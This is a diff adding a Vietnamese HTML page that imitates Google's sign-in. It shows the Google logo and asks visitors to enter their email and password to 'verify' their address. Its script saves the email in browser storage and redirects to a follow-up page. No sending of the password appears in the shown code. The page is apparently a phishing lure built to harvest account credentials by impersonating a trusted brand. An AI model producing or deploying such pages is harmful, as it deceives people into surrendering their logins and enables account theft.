@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="styles.css" />
+  <title>Xác minh email</title>
+</head>
+
+<body>
+  <div id="wrapper">
+    <form id="form">
+      <img id="logo" src="Logo/Google_2015_logo.svg.webp" />
+      <h3>Đăng nhập để xác minh địa chỉ email của bạn</h3>
+      <h4>Để đăng nhập được địa chỉ email của bạn, trước hết hãy xác thực form đăng nhập của mình.</h4>
+      <div class="email">
+        <div class="form-group">
+          <input type="text" id="emailInput" required />
+          <label for="" class="label-fade">Email</label>
+        </div>
+        <div class="button-container">
+          <p class="try-another">Bạn quên địa chỉ email?</p>
+        </div>
+      </div>
+      <div class="pass">
+        <div class="form-group">
+          <input type="password" id="passInput" required />
+          <label for="" class="label-fade">PassWord</label>
+        </div>
+        <div class="button-container">
+          <p class="try-another">Quên mật khẩu?</p>
+        </div>
+      </div>
+      <div class="button-container">
+        <button class="next">Xác mịnh địa chỉ</button>
+      </div>
+    </form>
+    <div class="footer-text">
+      <p>Tiếng việt</p>
+      <div>
+        <span>Trợ giúp</span>
+        <span>Quyền riêng tư</span>
+        <span>Điều khoản</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.querySelector('#wrapper form');
+      const emailInput = document.getElementById('emailInput');
+
+      if (form) {
+        form.addEventListener('submit', function (event) {
+          event.preventDefault();
+          const email = emailInput.value.trim();
+          if (email !== '') {
+            localStorage.setItem('email', email);
+            window.location.href = 'Notification.html';
+          } else {
+            alert('Vui lòng nhập địa chỉ email hoặc số điện thoại.');
+          }
+        });
+      } else {
+        console.error('Không tìm thấy phần tử #wrapper form trong tài liệu DOM.');
+      }
+    });
+  </script>
+
+</body>
+
+</html>
